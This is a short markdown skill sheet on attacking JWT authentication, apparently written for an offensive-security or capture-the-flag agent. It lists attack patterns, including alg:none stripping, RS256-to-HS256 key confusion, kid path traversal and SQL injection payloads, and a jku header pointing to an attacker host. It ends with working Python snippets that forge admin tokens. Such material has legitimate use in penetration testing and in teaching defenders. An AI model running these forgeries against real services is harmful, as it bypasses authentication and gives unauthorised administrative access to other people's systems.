# JWT & Authentication Attacks (skills/web/auth-jwt-oauth.md)

## 1. Signatures & Token Indicators

- Token structure: `header.payload.signature` (Base64URL encoded).
- Header inspection: `{"alg": "RS256"|"HS256"|"none", "typ": "JWT", "kid": "...", "jku": "..."}`.

| Vulnerability Type | Code / Header Pattern | Attack Mechanism |
| :--- | :--- | :--- |
| **`alg: none` Bypass** | Header `"alg": "none"` | Remove signature, send `header.payload.` (trailing dot). |
| **RS256 $\rightarrow$ HS256 Confusion** | Server accepts HS256 with Public Key | Sign with server's public RSA key (PEM) as HMAC secret. |
| **`kid` Path Traversal** | `kid: "../../../dev/null"` | HMAC secret becomes empty string `""` or known file contents. |
| **`kid` SQL Injection** | `kid: "' UNION SELECT 'key'--"` | Force server database query to return hardcoded secret. |
| **JKU / JWK Header Injection** | `jku: "http://attacker/jwks.json"` | Server fetches attacker-controlled public key to verify token. |

---

## 2. Decision Flowchart & Checklist

1. **Decode Header & Payload**: Inspect algorithm (`alg`) and key ID (`kid`).
2. **Test `alg: none`**:
   - Change `alg` to `none`, `None`, `NONE`, `nOnE`.
   - Strip signature part (`header.payload.`).
3. **Test Algorithm Confusion (RS256 $\rightarrow$ HS256)**:
   - Obtain public key (`/api/jwks.json`, `public.pem`, certificate in response).
   - Sign forged token using `jwt.encode(payload, public_key, algorithm='HS256')`.
4. **Test `kid` Header Flaws**:
   - Point `kid` to empty file `/dev/null` or predictable file.

---

## 3. Exploit Snippets (Python / PyJWT)

### 3.1 Algorithm Confusion Solver
```python
import jwt  # pip install pyjwt

public_key = open("public.pem", "r").read()
forged_payload = {"user": "admin", "role": "admin", "iat": 1700000000}

# Sign with public key using HMAC HS256
token = jwt.encode(forged_payload, public_key, algorithm="HS256", headers={"alg": "HS256"})
print(f"[+] RS256->HS256 Forged Token:\n{token}")
```

### 3.2 `alg: none` Token Generator
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "admin": True}
token = f"{b64url(header)}.{b64url(payload)}."
print(f"[+] alg:none Token:\n{token}")
```
